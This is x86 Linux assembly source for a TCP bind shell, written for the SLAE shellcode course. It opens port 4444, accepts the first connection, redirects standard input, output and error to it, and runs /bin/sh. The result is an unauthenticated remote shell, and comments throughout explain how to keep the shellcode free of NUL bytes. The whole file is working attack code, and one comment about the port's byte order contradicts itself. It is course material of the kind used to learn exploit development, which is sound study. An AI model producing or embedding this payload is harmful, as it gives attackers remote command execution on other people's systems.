; Simple x86 Linux TCP Bind Shell
; Author: @fbcsec
; This code was written to fulfill the requirements of the SecurityTube Linux Assembly Expert course:
; http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/index.html
; Student ID: SLAE - 1187

global _start

section .text

_start:

; Set the stage - Zero EAX, EBX, and EDX
    xor ebx, ebx
    mul ebx         ; MUL stores high order bits in EDX and low order bits in EAX.
                    ; so by MULing with a register that's already zero, we zero EAX and EDX.

; socket(AF_INET, SOCK_STREAM, 0)
; Get an initial file descriptor (fd) to use for further network calls.
    push eax ; socket int protocol (0x00)
    inc ebx  ; socketcall int call (0x01)
    push ebx ; socket type (SOCK_STREAM (0x01))
    push byte 0x02  ; socket domain (AF_INET (0x02))
    mov ecx, esp    ; move pointer to socket arguments into ecx
    mov al, 0x66    ; socketcall syscall id
    int 0x80        ; fire syscall
; A file descriptor for this socket is returned in EAX.

; bind(FD, *sockaddr, addrlen (0x10))
; Bind to a port number using the socket we've created so we can listen for connections.

    pop edi             ; EDI is now 0x02
    xchg edi, eax       ; sockfd is now in edi
    xchg ebx, eax       ; EAX now contains 0x00000002 (all but al is zero)
    mov al, 0x66        ; EAX now contains 0x00000066
                        ; This block is because we can't predict the file descriptor returned in EAX and must ensure all of EAX's bytes higher than AL are zeroed.

; build sockaddr struct on stack
; sockaddr's format: {word family (AF_INET), word port, dword ip address}
; IP and port number must be in network byte (big endian) order.
; I.E., port 4444 is 0x5c11 normally, in network byte order it's 0x5c11.

    push edx            ; push ip address to bind to (0x00000000 for all addresses (or INADDR_ANY)

; Writing the port number into our struct can be tricky.
; If the hex for our port number contains a NUL (0x00) we need to alter the code to avoid this NUL.
; If the port number to bind to contains no NULs we can simply do this:
    push word 0x5c11 ; PUSH '4444' in network byte order.

; If we want to bind to a port below 256 we'll need to use an empty register to build the numb
;(this is inadvisable, only root can bind to addresses under 1024)
    ;add dh, 0x05        ; Set up port number in network byte order in a register...
    ;push word dx        ; and then PUSH it
    ;xor edx, edx        ; zero EDX again

; If we wish to use a port number such as 43776, which in hex is AB00, we need to do something similar to the above.
    ;add dl, 0xAB        ; set up 43776 in network byte order in a register...
    ;push word dx        ; and then PUSH it
    ;xor edx, edx


    push word bx        ; push protocol family (0x02 for AF_INET)

; build bind() arguments and fire syscall
    mov ecx, esp
    push 0x10 ; push sockaddr struct length
    push ecx  ; push pointer to sockaddr
    push edi  ; push file descriptor
    mov ecx, esp ; move pointer to syscall arguments into ecx
    int 0x80

; listen(fd, int backlog)
; Begin listening for connections on the port we've bound.
    mov [ecx + 0x04], edx ; We re-use the bind argv array, eax is 0x00 from successful bind() return value. The backlog should be zero
    add bl, 0x02          ; set syscall listen() (4)
    mov al, 0x66
    int 0x80

; accept(int sockfd, null, 0x10)
; Accept the first incoming connection to our bound port.
; Despite what the man pages for accept(2) would have you beleive, this call is not picky about the second two arguments.
; We can just re-use the same arguments from the last call, still in ECX.
    inc ebx
    mov al, 0x66
    int 0x80
; This returns a new file descriptor for us representing the connection.

; dup2(connection_fd, fd_to_redirect)
; duplicate stderr, stdin, and stdout to connection file handle
; This lets us execve whatever we want and have its input, output, and errors flowing over the connection.

    xchg eax, ebx               ; move connection fd into ebx (old fd)
    mov ecx, edx                ; edx should still be zeroed, move it into ecx
    mov cl, 0x02                ; start at 0x02 (stderr)

dup2_loop:
    xor eax, eax
    mov al, 0x3f                ; move the syscall into eax
    int 0x80                    ; fire syscall
    dec ecx                     ; decrementing ecx will make it stdout after the first loop and stdin the last
    jns dup2_loop               ; if ecx turns negative, don't jmp

; execve /bin/sh

    push edx                    ; push zeroes to terminate /bin//sh string
    push 0x68732f2f             ; push /bin//sh to stack
    push 0x6e69622f
    mov ebx, esp                ; esp is a pointer to the /bin//sh string, store this in ebx
    push edx                    ; push a null for envp and to end the argv array
    mov edx, esp                ; store pointer to envp array in edx
    push ebx                    ; argv is an array of pointers to strings, /bin//sh must be the first argument, so we push its address to the stack.
    mov ecx, esp                ; store pointer to argv array in ecx
    mov al, 0x0b                ; set up syscall id and fire interrupt
    int 0x80

; At this point we should have delivered a shell to the first person connecting on our bound port.
